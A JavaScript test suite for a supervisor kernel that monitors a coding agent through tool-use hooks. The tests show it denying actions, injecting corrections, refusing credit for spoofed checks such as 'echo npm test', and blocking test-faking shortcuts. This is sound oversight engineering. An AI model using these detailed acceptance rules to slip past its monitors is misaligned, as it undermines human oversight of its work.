import test from "node:test";
import assert from "node:assert/strict";
import { appendFileSync, existsSync, mkdirSync, mkdtempSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { spawn } from "node:child_process";
import path from "node:path";
import { freezeContract } from "../src/outsider-work-contract.js";
import {
  auditSemanticContract, compileSemanticContract, contractCompilerPacket,
} from "../src/outsider-contract-compiler.js";
import { compactOutcomePacket, outcomePacket, verifyOutcome } from "../src/outsider-outcome-verifier.js";
import {
  auditCorrectionProposal, auditOutcomeApproval, auditSupervisorClearance,
  CORRECTION_AUDIT_PROMPT,
} from "../src/outsider-semantic-audit.js";
import {
  correctionAuthorityFrom, currentSourceEvidence, frozenAcceptanceEvidence, supervisorPacket,
  SUPERVISOR_PROMPT, validCorrectionAuthority,
} from "../src/outsider-supervisor-session.js";
import { runFreshJsonCommand } from "../src/outsider-json-command.js";
import {
  activeControllerShiftEvidence, OutsiderKernelController, runAcceptance,
} from "../src/outsider-kernel-controller.js";
import {
  controlledWorkerLaunchPlan, controlledWorkerSettings, isolatedWorkerEnvironment,
  preflightWorkerCli, resolveSupervisorCommand,
  startKernelRun, workerMandate,
} from "../src/outsider-kernel-runner.js";
import {
  diffSnapshots, RunStore, snapshotWorkspace, supervisorReliability, validateCausalProof,
} from "../src/outsider-kernel-store.js";
import {
  controllerSocketPath, createControllerToken, requestController, startControllerRpc,
} from "../src/outsider-controller-rpc.js";
import { startControllerWatchdog } from "../src/outsider-controller-watchdog.js";
import { assessAgentTeamConformance } from "../src/outsider-agent-team-conformance.js";

function workspace() {
  const cwd = mkdtempSync(path.join(tmpdir(), "outsider-kernel-work-"));
  const stateRoot = mkdtempSync(path.join(tmpdir(), "outsider-kernel-state-"));
  mkdirSync(path.join(cwd, "src"));
  writeFileSync(path.join(cwd, "src", "value.js"), "export const value = 1;\n");
  const transcript = path.join(cwd, "session.jsonl");
  writeFileSync(transcript, "");
  return { cwd, transcript, stateRoot };
}

function harness({ decide = null, verdict = null, outcomeVerdict = null, acceptanceResults = null,
  supervisorHandler = null, verifierHandler = null, maxSupervisorCalls = 24,
  correctionAuditorHandler = null, outcomeAuditorHandler = null, clearanceAuditorHandler = null,
  semanticPatrolEvery = 96, semanticPatrolMinEvidenceSteps = 0,
  agentTeamPolicy = null,
  controllerOwnedWorkspace = false, allowedEvaluatorFaultSourceHash = null,
  acceptanceCommand = "npm test", operatorAsk = "把 value 改成 2，并保持设计直接" } = {}) {
  const { cwd, transcript } = workspace();
  const baseline = snapshotWorkspace(cwd);
  const semantic = {
    objective: "让 value 的公开行为变为 2，而不是伪造测试结果",
    successCriteria: ["模块导出的 value 为 2"],
    architecturalConstraints: ["保持公开导出 API"],
    forbiddenShortcuts: ["不修改测试来制造绿灯"],
    scope: { in: ["src/value.js"], out: ["依赖升级"] },
    uncertainties: [],
  };
  const contract = freezeContract({ cwd, ask: operatorAsk,
    acceptance: acceptanceCommand, semantic, semanticAudit: { passed: true,
      evidenceHash: "sha256:test-contract-audit" }, baselineEvidence: baseline });
  const stateRoot = mkdtempSync(path.join(tmpdir(), "outsider-kernel-state-"));
  const store = RunStore.create({
    cwd, contract, supervisorCommand: "fake-supervisor", stateRoot,
  });
  if (controllerOwnedWorkspace) store.writeJson("workspace-identity.json", {
    canonicalCwd: cwd,
    workspaceRoot: cwd,
    resolutionSource: "test-runner-cwd",
    artifactEvidenceAuthority: "controller-owned",
  });
  store.append("contract_compiled", { objective: semantic.objective, successCriteria: semantic.successCriteria.length });
  store.append("contract_audited", { passed: true, evidenceHash: "sha256:test-contract-audit" });
  store.append("contract_frozen", { ask: contract.ask, acceptance: contract.acceptance });
  const results = acceptanceResults ?? [
    { ran: true, passed: false, exit: 1, command: "npm test", output: "expected 2, received 1" },
    { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" },
    { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" },
  ];
  let acceptanceCalls = 0;
  const controller = new OutsiderKernelController({
    store,
    baseline,
    decide: decide ?? (() => ({ verdict: "allow", proposed: { action: "read", irreversible: false } })),
    acceptance: () => results[Math.min(acceptanceCalls++, results.length - 1)],
    supervisor: (request) => {
      const { packet } = request;
      if (supervisorHandler) return supervisorHandler(request);
      assert.equal(packet.acceptance.output.includes("expected 2") || packet.acceptance.passed, true,
        "supervisor receives real acceptance evidence, not just an exit-code label");
      assert.ok(packet.diff && Array.isArray(packet.diff.changes), "supervisor receives content-level diff evidence");
      return { ok: true, verdict: verdict ?? {
        onTrack: false,
        drift: "实现没有满足冻结的验收标准",
        plan: ["修改 src/value.js，把 value 改为 2", "重新运行验收"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "当前会失败",
      } };
    },
    verifier: (options) => {
      if (verifierHandler) return verifierHandler(options);
      const { contract: frozen, diff, acceptance: accepted } = options;
      assert.ok(frozen.semantic?.forbiddenShortcuts?.length);
      assert.ok(Array.isArray(diff.changes));
      assert.equal(accepted.passed, true);
      return { ok: true, verdict: outcomeVerdict ?? {
        passed: true,
        gaps: [],
        evidence: ["最终 diff 满足语义合同，且独立验收通过"],
      } };
    },
    correctionAuditor: (options) => correctionAuditorHandler
      ? correctionAuditorHandler(options) : { ok: true, packet: { proposal: options.proposal }, verdict: {
        passed: true, errors: [], verifiedFacts: ["proposal facts independently checked"],
      } },
    outcomeAuditor: (options) => outcomeAuditorHandler
      ? outcomeAuditorHandler(options) : { ok: true,
        packet: { proposedVerdict: options.proposedVerdict }, verdict: {
          passed: true, errors: [], verifiedFacts: ["PASS independently checked"],
        } },
    clearanceAuditor: (options) => clearanceAuditorHandler
      ? clearanceAuditorHandler(options) : { ok: true,
        packet: { proposedClearance: options.proposal }, verdict: {
          passed: true, errors: [], verifiedFacts: ["clearance independently checked"],
        } },
    maxSupervisorCalls,
    semanticPatrolEvery,
    semanticPatrolMinEvidenceSteps,
    allowedEvaluatorFaultSourceHash,
    agentTeamPolicy,
  });
  return { cwd, transcript, store, controller };
}

test("a frozen Agent Team policy blocks lead writes to teammate-owned slices before theater can occur", () => {
  const h = harness({ agentTeamPolicy: {
    schema: "outsider/agent-team-policy/v1",
    enforceExclusiveSliceOwnership: true,
    requireDelegationBinding: false,
    requiredTeammates: ["store-owner"],
    expectedFilesByTeammate: { "store-owner": "src/value.js" },
  } });
  const mainEdit = {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "lead-theater-edit",
    tool_input: { file_path: "src/value.js", old_string: "1", new_string: "2" },
  };
  const blocked = h.controller.preTool({ input: mainEdit });
  assert.equal(blocked.decision.verdict, "deny");
  assert.match(blocked.output.hookSpecificOutput.permissionDecisionReason,
    /store-owner|不能代写/u);
  const event = h.store.events().find((item) => item.type === "team_slice_ownership_blocked");
  assert.equal(event.agentId, "main");
  assert.equal(event.expectedAgentId, "teammate:store-owner");
  assert.equal(event.file, "src/value.js");
  assert.equal(event.modelCallUsed, false);
  assert.equal(h.store.events().some((item) => item.type === "file_effect_prepared"
    && item.toolUseId === "lead-theater-edit"), false);

  const ownerEdit = { ...mainEdit, tool_use_id: "owner-edit", teammate_name: "store-owner" };
  const allowed = h.controller.preTool({ input: ownerEdit });
  assert.equal(allowed.decision.verdict, "allow");
  assert.ok(h.store.events().some((item) => item.type === "file_effect_prepared"
    && item.toolUseId === "owner-edit"));
});

test("lead integration files remain locked until the frozen graph and teammate completions exist", () => {
  const h = harness({ agentTeamPolicy: {
    schema: "outsider/agent-team-policy/v1",
    enforceExclusiveSliceOwnership: true,
    requiredTeammates: ["store-owner", "scheduler-owner"],
    expectedFilesByTeammate: {
      "store-owner": "src/store.js", "scheduler-owner": "src/scheduler.js",
    },
    expectedFilesByLead: ["src/recovery.js", "src/index.js"],
  } });
  writeFileSync(path.join(h.cwd, "src", "recovery.js"), "export const recover = 1;\n");
  const edit = { hook_event_name: "PreToolUse", tool_name: "Edit",
    tool_use_id: "lead-recovery-edit",
    tool_input: { file_path: "src/recovery.js", old_string: "1", new_string: "2" } };
  const beforeGraph = h.controller.preTool({ input: edit });
  assert.equal(beforeGraph.decision.verdict, "deny");
  assert.match(beforeGraph.output.hookSpecificOutput.permissionDecisionReason,
    /任务图|切片|完成/u);

  h.store.saveState({ tasks: {
    store: { id: "store", kind: "team", owner: "store-owner", status: "completed",
      blockedBy: [] },
    scheduler: { id: "scheduler", kind: "team", owner: "scheduler-owner",
      status: "in_progress", blockedBy: [] },
    integration: { id: "integration", kind: "team", owner: "lead", status: "pending",
      blockedBy: ["store", "scheduler"] },
  } });
  const beforeCompletion = h.controller.preTool({ input: { ...edit,
    tool_use_id: "lead-before-completion" } });
  assert.equal(beforeCompletion.decision.verdict, "deny");
  assert.match(beforeCompletion.output.hookSpecificOutput.permissionDecisionReason,
    /scheduler-owner/u);

  const state = h.store.readState();
  state.tasks.scheduler.status = "completed";
  h.store.saveState({ tasks: state.tasks });
  const allowed = h.controller.preTool({ input: { ...edit, tool_use_id: "lead-after-slices" } });
  assert.equal(allowed.decision.verdict, "allow");
  assert.equal(h.store.events().filter((event) =>
    event.type === "lead_integration_ordering_blocked").length, 2);
});

test("a blocked integration task cannot enter running state before dependencies complete", () => {
  const h = harness();
  h.store.saveState({ tasks: {
    slice: { id: "slice", kind: "team", owner: "alice", status: "in_progress",
      blockedBy: [] },
    integration: { id: "integration", kind: "team", owner: "lead", status: "pending",
      blockedBy: ["slice"] },
  } });
  const update = { hook_event_name: "PreToolUse", tool_name: "TaskUpdate",
    tool_use_id: "start-integration",
    tool_input: { taskId: "integration", status: "in_progress" } };
  const denied = h.controller.preTool({ input: update });
  assert.equal(denied.decision.verdict, "deny");
  assert.match(denied.output.hookSpecificOutput.permissionDecisionReason,
    /未完成依赖|slice/u);
  const state = h.store.readState();
  state.tasks.slice.status = "completed";
  h.store.saveState({ tasks: state.tasks });
  assert.equal(h.controller.preTool({ input: { ...update,
    tool_use_id: "start-integration-after-slice" } }).decision.verdict, "allow");
});

test("a host-confirmed teammate binding proves a delivered spawn correction exactly once", () => {
  const h = harness();
  const observed = h.store.append("correction_observed", {
    interventionId: "spawn-intervention", agentId: "main",
    correctionAuthorityHash: "sha256:spawn-authority",
  });
  h.store.saveState({
    tasks: { store: { id: "store", kind: "team", owner: "store-owner",
      status: "pending", blockedBy: [] } },
    agents: { raw: { id: "raw", agentKind: "subagent", status: "running" } },
    openInterventions: { main: {
      id: "spawn-intervention", correctionObserved: true,
      correctionObservedSeq: observed.seq, correctionAuthorityHash: "sha256:spawn-authority",
      matchedExpectedActions: {}, expectedActions: [
        { kind: "spawnTeammate", actor: "main", name: "store-owner", model: "sonnet" },
      ],
    } },
    teamSpawnIntents: { intent: {
      intentHash: "sha256:intent", toolUseIdHash: "sha256:tool",
      teammateNameHash: "sha256:name", canonicalAgentId: "teammate:store-owner",
      spawnDelegationId: null, teamTaskId: "store",
      taskLinkStatus: "unique-owned-team-task",
    } },
    teamSpawnReceipts: { "sha256:agent": {
      receiptHash: "sha256:receipt", spawnIntentHash: "sha256:intent",
      toolUseIdHash: "sha256:tool", receiptAgentIdHash: "sha256:agent",
    } },
  });
  const registration = h.store.append("agent_registered", {
    agentId: "raw", agentKind: "subagent",
  });
  const context = h.store.append("subagent_context_injected", { agentId: "raw" });
  h.store.saveState({ teamSubagentStarts: { "sha256:agent": {
    rawAgentId: "raw", registrationSeq: registration.seq,
    registrationEventHash: registration.eventHash, contextSeq: context.seq,
    contextEventHash: context.eventHash,
  } } });

  const binding = h.controller.completeTeamSpawnIdentity("sha256:agent");
  assert.ok(binding?.bindingHash);
  const effects = h.store.events().filter((event) => event.type === "effect_observed"
    && event.interventionId === "spawn-intervention");
  assert.equal(effects.length, 1);
  assert.equal(effects[0].effectKind, "spawnTeammate");
  assert.equal(effects[0].correctionAuthorityHash, "sha256:spawn-authority");
  assert.equal(h.store.readState().openInterventions.main.effectObserved, true);
  h.controller.completeTeamSpawnIdentity("sha256:agent");
  assert.equal(h.store.events().filter((event) => event.type === "effect_observed"
    && event.interventionId === "spawn-intervention").length, 1);
});

test("a frozen Agent Team policy binds wrapped teammate and integration checks at PostToolUse", () => {
  const h = harness({ agentTeamPolicy: {
    schema: "outsider/agent-team-policy/v1",
    enforceExclusiveSliceOwnership: true,
    requireDelegationBinding: false,
    requiredTeammates: ["store-owner"],
    expectedFilesByTeammate: { "store-owner": "src/value.js" },
    expectedChecksByTeammate: { "store-owner": "npm run test:store" },
    expectedIntegrationCheck: "npm test",
  } });
  const teammateInput = {
    hook_event_name: "PostToolUse", teammate_name: "store-owner",
    tool_name: "Bash", tool_use_id: "store-check",
    tool_input: { command: `cd ${JSON.stringify(h.cwd)} && npm run test:store` },
    tool_response: { exit_code: 0 },
  };
  h.controller.postTool({ input: teammateInput });
  const teammateCheck = h.store.events().find((event) =>
    event.type === "boundary_reached" && event.toolUseId === "store-check");
  assert.equal(teammateCheck.expectedCheckMatch, "exact-workspace-cd-wrapper");
  assert.match(teammateCheck.expectedCheckHash, /^sha256:/);

  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "Bash", tool_use_id: "integration-check",
    tool_input: { command: `cd ${JSON.stringify(h.cwd)} && npm test` },
    tool_response: { exit_code: 0 },
  } });
  const integrationCheck = h.store.events().find((event) =>
    event.type === "boundary_reached" && event.toolUseId === "integration-check");
  assert.equal(integrationCheck.expectedCheckMatch, "exact-workspace-cd-wrapper");
  assert.match(integrationCheck.expectedCheckHash, /^sha256:/);
});

function applyObservedCorrection(h) {
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  assert.ok(correction?.marker);
  appendFileSync(h.transcript, `${JSON.stringify({ type: "user", message: { content: correction.marker } })}\n`);
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");
}

function bindNamedAgent(h, input) {
  const first = h.controller.preTool({ input: { ...input, hook_event_name: "PreToolUse" } });
  if (first.output?.hookSpecificOutput?.permissionDecision === "allow") {
    return { input, first, allowed: first };
  }
  assert.equal(first.output?.hookSpecificOutput?.permissionDecision, "deny");
  const corrective = String(first.output?.hookSpecificOutput?.additionalContext ?? "");
  const match = /NEXT_PROMPT_BEGIN\n([\s\S]*)\nNEXT_PROMPT_END$/.exec(corrective);
  assert.ok(match, corrective);
  const boundInput = {
    ...input,
    tool_input: { ...(input.tool_input ?? {}), prompt: match[1] },
  };
  const allowed = h.controller.preTool({ input: {
    ...boundInput, hook_event_name: "PreToolUse",
  } });
  assert.equal(allowed.output?.hookSpecificOutput?.permissionDecision, "allow",
    allowed.output?.hookSpecificOutput?.permissionDecisionReason);
  return { input: boundInput, first, allowed };
}

test("UTF-8 source containing a literal NUL remains available as controller evidence", () => {
  const { cwd } = workspace();
  const before = snapshotWorkspace(cwd);
  writeFileSync(path.join(cwd, "src", "value.js"),
    Buffer.from("export const key = `tenant\0event`;\n", "utf8"));
  const after = snapshotWorkspace(cwd);
  assert.equal(after.files["src/value.js"].textStatus, "captured");
  assert.match(after.files["src/value.js"].text, /tenant\u0000event/);
  const diff = diffSnapshots(before, after);
  assert.notEqual(diff.changes.find((item) => item.path === "src/value.js")?.after, null);
  const evidence = currentSourceEvidence(after, {
    semantic: { scope: { in: ["src/value.js"] }, successCriteria: [] },
  });
  const source = evidence.find((item) => item.path === "src/value.js");
  assert.equal(source.textStatus, "captured");
  assert.match(source.content, /tenant\u0000event/);
});

test("Claude's scheduled-task lock cannot change the delivered artifact fingerprint", () => {
  const { cwd } = workspace();
  const baseline = snapshotWorkspace(cwd);
  mkdirSync(path.join(cwd, ".claude"), { recursive: true });
  writeFileSync(path.join(cwd, ".claude", "scheduled_tasks.lock"), "host-owned\n");
  const withLock = snapshotWorkspace(cwd);
  assert.equal(withLock.fingerprint, baseline.fingerprint);
  assert.equal(withLock.files[".claude/scheduled_tasks.lock"], undefined);

  writeFileSync(path.join(cwd, ".claude", "project-settings.json"), "{}\n");
  const withProjectFile = snapshotWorkspace(cwd);
  assert.notEqual(withProjectFile.fingerprint, baseline.fingerprint,
    "the exclusion is exact and does not hide project-owned Claude configuration");
});

test("PreToolUse causal slice: pause → independent plan → observed correction → effect → green", () => {
  const h = harness({
    decide: () => ({
      verdict: "warn",
      reason: "tests are red at delivery",
      corrective: "repair before submitting",
      proposed: { action: "git commit", isSubmit: true, irreversible: false },
    }),
  });
  const first = h.controller.preTool({
    input: { hook_event_name: "PreToolUse", tool_name: "Bash",
      tool_input: { command: "git commit -am done" }, transcript_path: h.transcript },
  });
  assert.equal(first.output.hookSpecificOutput.permissionDecision, "deny");
  assert.match(first.output.hookSpecificOutput.additionalContext, /OUTSIDER_INTERVENTION:/);
  assert.match(first.output.hookSpecificOutput.permissionDecisionReason, /OUTSIDER_INTERVENTION:/,
    "the guaranteed deny-reason channel carries the complete correction marker");
  applyObservedCorrection(h);
  const stop = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  assert.equal(stop.output.decision, "approve");
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, true, finished.proof.errors.join("; "));
  let events = h.store.events();
  const captured = events.find((event) => event.type === "evidence_captured");
  assert.ok(captured?.evidenceFile);
  assert.equal(h.store.readJson(captured.evidenceFile).ask, h.store.contract.ask,
    "the exact packet sent to the supervisor remains independently auditable");
  assert.match(captured.evidenceHash, /^sha256:/);
  assert.ok(events.some((event) => event.type === "boundary_paused" && event.boundary === "PreToolUse"));
  assert.ok(events.some((event) => event.type === "supervisor_verdict"
    && event.onTrack === false && event.planSteps === 2));
  assert.ok(events.some((event) => event.type === "correction_observed"));
  assert.ok(events.some((event) => event.type === "effect_observed"));
  assert.ok(events.some((event) => event.type === "correction_factual_audit" && event.passed));
  assert.ok(events.some((event) => event.type === "outcome_approval_audit" && event.passed));
  const finalized = events.find((event) => event.type === "run_finalized");
  assert.equal(finalized.supervisorReliability.correctionsDelivered, 1);
  assert.equal(finalized.supervisorReliability.correctionsWithEffect, 1);
  assert.equal(finalized.supervisorReliability.correctionFactualErrorRate, 0);
});

test("effect evidence treats supervisor prose after an edit path as guidance, not filename", () => {
  const h = harness({
    verdict: {
      onTrack: false,
      drift: "the implementation is still wrong",
      plan: ["repair the source", "rerun acceptance"],
      expectedNextActions: ["edit:src/value.js (if the probe is still red)", "run:npm test"],
      acceptanceRisk: "red",
    },
  });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  assert.ok(correction?.marker);
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: correction.marker } })}\n`);
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");
  h.controller.preTool({ input: { hook_event_name: "PreToolUse", tool_name: "Bash",
    tool_input: { command: "npm test" }, transcript_path: h.transcript } });
  assert.ok(h.store.events().some((event) => event.type === "effect_observed"
    && event.interventionId === correction.interventionId));
});

test("executed correction actions prove an effect even when the edited artifact is temporary", () => {
  const h = harness({ verdict: {
    onTrack: false,
    drift: "the claimed mechanism needs an independent executable check",
    plan: ["write a temporary probe", "run the probe", "rerun acceptance"],
    expectedNextActions: [
      "edit:/tmp/sanity_check.mjs",
      "run:node /tmp/sanity_check.mjs",
      "run:npm test",
    ],
    acceptanceRisk: "red until independently exercised",
  } });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: correction.marker } })}\n`);

  const before = { hook_event_name: "PreToolUse", tool_name: "Write",
    tool_use_id: "tool-write-probe", tool_input: { file_path: "/tmp/sanity_check.mjs" },
    transcript_path: h.transcript };
  h.controller.preTool({ input: before });
  h.controller.postTool({ input: { ...before, hook_event_name: "PostToolUse",
    tool_response: { exit_code: 0 } } });

  const effect = h.store.events().find((event) => event.type === "effect_observed"
    && event.interventionId === correction.interventionId);
  assert.equal(effect.effectKind, "edit");
  assert.deepEqual(JSON.parse(effect.matchedExpectedAction), {
    ephemeral: true, kind: "probeArtifact", path: "/tmp/sanity_check.mjs",
  });
  assert.equal(effect.toolUseId, "tool-write-probe");
  assert.equal(effect.exit, 0);
  assert.ok(effect.eventSeq > effect.afterCorrectionSeq,
    "the proof carries its own post-correction ordering guard");
  assert.ok(h.store.events().some((event) => event.type === "expected_action_observed"
    && JSON.parse(event.expectedAction).kind === "probeArtifact"));
});

test("run effects require an exact post-correction command and a successful exit", () => {
  const h = harness({ verdict: {
    onTrack: false,
    drift: "acceptance was not actually rerun",
    plan: ["run the frozen acceptance"],
    expectedNextActions: ["run:npm test"],
    acceptanceRisk: "unknown",
  } });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: correction.marker } })}\n`);

  const record = (id, command, exit) => {
    const input = { hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: id,
      tool_input: { command }, transcript_path: h.transcript };
    h.controller.preTool({ input });
    h.controller.postTool({ input: { ...input, hook_event_name: "PostToolUse",
      tool_response: { exit_code: exit } } });
  };
  record("echo", "echo npm test", 0);
  record("red", "npm test", 1);
  assert.equal(h.store.events().some((event) => event.type === "effect_observed"
    && event.interventionId === correction.interventionId), false);
  record("green", "npm test", 0);
  const effect = h.store.events().find((event) => event.type === "effect_observed"
    && event.interventionId === correction.interventionId);
  assert.equal(effect.effectKind, "run");
  assert.equal(effect.toolUseId, "green");
  assert.equal(effect.exit, 0);
  assert.match(effect.artifactFingerprint, /^sha256:/);
});

test("a compound frozen runRef matches behind a workspace cd but not as partial prose", () => {
  const h = harness({ acceptanceCommand: "npm test && node sealed.mjs --token frozen", verdict: {
    onTrack: false,
    drift: "the compound frozen acceptance was not executed",
    plan: ["run the exact compound acceptance"],
    expectedNextActions: ["run:npm test && node sealed.mjs --token frozen"],
    acceptanceRisk: "unknown",
  } });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: correction.marker } })}\n`);
  const record = (id, command) => {
    const input = { hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: id,
      tool_input: { command }, transcript_path: h.transcript };
    h.controller.preTool({ input });
    h.controller.postTool({ input: { ...input, hook_event_name: "PostToolUse",
      tool_response: { exit_code: 0 } } });
  };
  record("partial", "echo 'npm test && node sealed.mjs --token frozen'");
  assert.equal(h.store.events().some((event) => event.type === "effect_observed"), false);
  record("compound", `cd "${h.cwd}" && npm test && node sealed.mjs --token frozen`);
  const effect = h.store.events().find((event) => event.type === "effect_observed");
  assert.equal(effect.toolUseId, "compound");
  assert.deepEqual(JSON.parse(effect.matchedExpectedAction), {
    expectExit: 0, kind: "runRef", ref: "frozenAcceptance",
  });
});

test("an unrelated worker self-repair is observed but never credited to a verification-only correction", () => {
  const h = harness({ verdict: {
    onTrack: false,
    drift: "only the frozen acceptance needs to be rerun",
    plan: ["rerun acceptance"],
    expectedNextActions: ["run:npm test"],
    acceptanceRisk: "unknown",
  } });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: correction.marker } })}\n`);
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");
  h.controller.preTool({ input: { hook_event_name: "PreToolUse", tool_name: "Read",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript } });
  assert.equal(h.store.events().some((event) => event.type === "effect_observed"
    && event.interventionId === correction.interventionId), false);
  const unattributed = h.store.events().find((event) =>
    event.type === "unattributed_workspace_change_observed");
  assert.equal(unattributed.interventionId, correction.interventionId);
  assert.match(unattributed.artifactFingerprint, /^sha256:/);
});

test("a matched verification action on an older tree cannot claim a later self-repaired delivery", () => {
  const h = harness({ verdict: {
    onTrack: false,
    drift: "only the frozen acceptance needs to be rerun",
    plan: ["rerun acceptance"],
    expectedNextActions: ["run:npm test"],
    acceptanceRisk: "unknown",
  } });
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: correction.marker } })}\n`);
  const runInput = { hook_event_name: "PreToolUse", tool_name: "Bash",
    tool_use_id: "verified-old-tree", tool_input: { command: "npm test" },
    transcript_path: h.transcript };
  h.controller.preTool({ input: runInput });
  h.controller.postTool({ input: { ...runInput, hook_event_name: "PostToolUse",
    tool_response: { exit_code: 0 } } });
  const oldEffect = h.store.events().find((event) => event.type === "effect_observed");
  assert.deepEqual(JSON.parse(oldEffect.matchedExpectedAction), {
    expectExit: 0, kind: "runRef", ref: "frozenAcceptance",
  });

  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");
  h.controller.preTool({ input: { hook_event_name: "PreToolUse", tool_name: "Read",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript } });
  const stop = h.controller.stop({ input: { hook_event_name: "Stop",
    stop_hook_active: true, transcript_path: h.transcript } });
  assert.equal(stop.output.decision, "approve");
  assert.ok(h.store.events().some((event) => event.type === "intervention_unresolved"
    && event.reason === "no authority-matched effect exists on the delivered fingerprint"));
  assert.equal(h.store.events().some((event) => event.type === "intervention_resolved"), false);
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, false);
  assert.equal(finished.proof.deliveryComplete, true);
  assert.equal(finished.proof.interventionComplete, false);
  assert.match(finished.proof.errors.join(" "), /no intervention has a complete causal chain/);
});

test("an ineffective correction is independently re-planned before the worker reaches Stop", () => {
  let decisions = 0;
  let supervisorCalls = 0;
  const red = { ran: true, passed: false, exit: 1, command: "npm test", output: "still structurally wrong" };
  const h = harness({
    decide: () => {
      decisions += 1;
      return decisions === 1 ? {
        verdict: "warn",
        reason: "trajectory drift",
        corrective: "repair the mechanism",
        proposed: { action: "edit", irreversible: false },
      } : { verdict: "allow", proposed: { action: "read", irreversible: false } };
    },
    acceptanceResults: [red, red],
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      if (supervisorCalls === 2) {
        assert.ok(packet.priorInterventions.some((event) => event.type === "effect_observed"),
          "the re-diagnosis sees that the previous plan changed behavior but did not fix the outcome");
      }
      return { ok: true, verdict: {
        onTrack: false,
        drift: supervisorCalls === 1 ? "初始实现机制不对" : "上一份纠正改了文件但根因仍在",
        plan: [supervisorCalls === 1 ? "修改 src/value.js" : "撤销错误假设并重做 src/value.js"],
        expectedNextActions: ["edit:src/value.js"],
        acceptanceRisk: "仍会失败",
      } };
    },
  });
  const first = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse",
    tool_name: "Edit",
    tool_input: { file_path: "src/value.js" },
    transcript_path: h.transcript,
  } });
  assert.equal(first.output.hookSpecificOutput.permissionDecision, "deny");
  applyObservedCorrection(h);
  let followup = null;
  for (let index = 0; index < 6; index += 1) {
    followup = h.controller.preTool({ input: {
      hook_event_name: "PreToolUse",
      tool_name: "Read",
      tool_input: { file_path: "src/value.js" },
      transcript_path: h.transcript,
    } });
    if (index < 5) assert.equal(followup.output.hookSpecificOutput.permissionDecision, "allow");
  }
  assert.equal(followup.output.hookSpecificOutput.permissionDecision, "deny");
  assert.match(followup.output.hookSpecificOutput.permissionDecisionReason, /复验后确认/);
  assert.equal(supervisorCalls, 2);
  const corrections = h.store.events().filter((event) => event.type === "correction_emitted");
  assert.equal(corrections.length, 2);
  assert.notEqual(corrections[0].interventionId, corrections[1].interventionId);
  assert.ok(h.store.events().some((event) => event.type === "intervention_replanned"));
});

test("Stop causal slice returns the same worker to a supervisor-authored plan", () => {
  const h = harness();
  const first = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  assert.equal(first.output.decision, "block");
  assert.match(first.output.reason, /OUTSIDER_INTERVENTION:/);
  applyObservedCorrection(h);
  for (let index = 0; index < 6; index += 1) {
    const boundary = h.controller.preTool({ input: {
      hook_event_name: "PreToolUse", tool_name: "Read",
      tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
    } });
    assert.equal(boundary.output.hookSpecificOutput.permissionDecision, "allow",
      "a Stop correction is settled by the next Stop, not re-diagnosed mid-flight");
  }
  assert.equal(h.store.events().filter((event) => event.type === "correction_emitted").length, 1);
  assert.ok(h.store.events().some((event) => event.type
    === "intervention_followup_deferred_to_stop"));
  const second = h.controller.stop({ input: { hook_event_name: "Stop", stop_hook_active: true,
    transcript_path: h.transcript } });
  assert.equal(second.output.decision, "approve");
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, true, finished.proof.errors.join("; "));
});

test("acceptance-output fallback cannot masquerade as an independent correction", () => {
  const h = harness({ verdict: { onTrack: true, drift: "", plan: [], acceptanceRisk: "unknown" } });
  const first = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  assert.equal(first.output.decision, "block");
  assert.match(first.output.reason, /不是独立诊断/);
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, false);
  assert.match(finished.proof.errors.join(" "), /no intervention has a complete causal chain/);
  assert.equal(h.store.events().some((event) => event.type === "correction_emitted"), false);
});

test("causal proof rejects event streams assembled from different runs", () => {
  const events = [
    { runId: "a", seq: 1, type: "correction_emitted", source: "supervisor_plan", interventionId: "i" },
    { runId: "b", seq: 2, type: "acceptance_finished", ran: true, passed: true },
  ];
  const proof = validateCausalProof(events);
